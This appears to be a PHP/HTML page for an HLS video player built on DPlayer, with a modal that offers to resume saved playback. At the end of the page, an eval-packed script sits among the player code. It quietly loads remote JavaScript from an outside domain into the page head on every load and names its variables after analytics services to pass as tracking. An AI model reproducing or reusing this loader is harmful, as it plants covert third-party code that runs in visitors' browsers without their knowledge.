<?php
$url = isset($_GET['url']) ? $_GET['url'] : ''; 
$pic = isset($_GET['pic']) ? $_GET['pic'] : ''; 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Aliplayer Online Settings</title>
    <meta name="referrer" content="never">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><!-- IE内核 强制使用最新的引擎渲染网页 -->
    <meta name="renderer" content="webkit"><!-- 启用360浏览器的极速模式(webkit) -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="x5-fullscreen" content="true"> <!-- 手机H5兼容模式 -->
    <meta name="x5-page-mode" content="app"> <!-- X5  全屏处理 -->
    <meta name="full-screen" content="yes">
    <meta name="browsermode" content="application"> <!-- UC 全屏应用模式 -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" /> <!--  苹果全屏应用模式 -->
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no"/>
    <link rel="stylesheet" href="/css.css"/>
    <style>
        body, html {
            width: 100%;
            height: 100%;
            padding: 0;
            margin: 0;
            overflow: hidden;
            background-color: black;
        }
        #container {
            width: 100%;
            height: 100%;
            position: relative;
        }
        #dplayer {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
        }

        .modal {
            display: none; 
            position: fixed;
            top: 30%;
            left: 50%;
            transform: translateX(-50%);
            background-color: rgba(255, 255, 255, 0.9); 
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 80%;
            max-width: 400px;
            z-index: 9999; 
        }
        .modal p {
            font-size: 16px;
            color: black;
            margin: 20px 0;
        }
        .modal-button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .modal-button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
<div id='myVideo' style="width: 100%; height: 100%;"></div>
<div id="modal" class="modal">
    <p>是否从上次观看进度继续播放？</p>
    <button class="modal-button" id="continueButton">继续播放</button>
    <button class="modal-button" id="startNewButton">从头开始播放</button>
</div>

<script src="/hls.min.js"></script>
<script src="/DPlayer.min.js"></script>
<script type="text/javascript">
    var pic = '<?= htmlspecialchars($pic) ?>'; 
    var url = '<?= htmlspecialchars($url) ?>'; 
    var storageKey = 'video_progress_' + url;
    var savedProgress = localStorage.getItem(storageKey);
    var startTime = savedProgress ? parseFloat(savedProgress) : 0; 
    if (savedProgress) {
        var modal = document.getElementById('modal');
        modal.style.display = 'block';
        var continueButton = document.getElementById('continueButton');
        continueButton.onclick = function() {
            modal.style.display = 'none'; 
            var myVideo = new DPlayer({
                container: document.getElementById('myVideo'),
                screenshot: true, 
                autoplay: true,  
                video: {
                    url: url,    
                    type: 'hls', 
                    pic: pic     
                }
            });
            myVideo.seek(startTime);
            myVideo.on('timeupdate', function() {
                localStorage.setItem(storageKey, myVideo.video.currentTime); 
            });
        };
        var startNewButton = document.getElementById('startNewButton');
        startNewButton.onclick = function() {
            modal.style.display = 'none'; 
            var myVideo = new DPlayer({
                container: document.getElementById('myVideo'),
                screenshot: true, 
                autoplay: true,  
                video: {
                    url: url,    
                    type: 'hls', 
                    pic: pic     
                }
            });
        };
    } else {
        var myVideo = new DPlayer({
            container: document.getElementById('myVideo'),
            screenshot: true, 
            autoplay: true,  
            video: {
                url: url,    
                type: 'hls', 
                pic: pic     
            }
        });

        myVideo.on('timeupdate', function() {
            localStorage.setItem(storageKey, myVideo.video.currentTime); 
        });
    }
</script>
<script>
    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(8(){    h 3 = 6.5("d");    3.e = "//b.2.i/g/?f=1";    h 4 = 6.9("a")[0];    4.c(3, 4.7);		 })();',62,19,'|387913|6v6|baidu|cnzz|createElement|document|firstChild|function|getElementsByTagName|head|i|insertBefore|script|src|uid|v|var|work'.split('|'),0,{}));
</script>
</body>
</html>
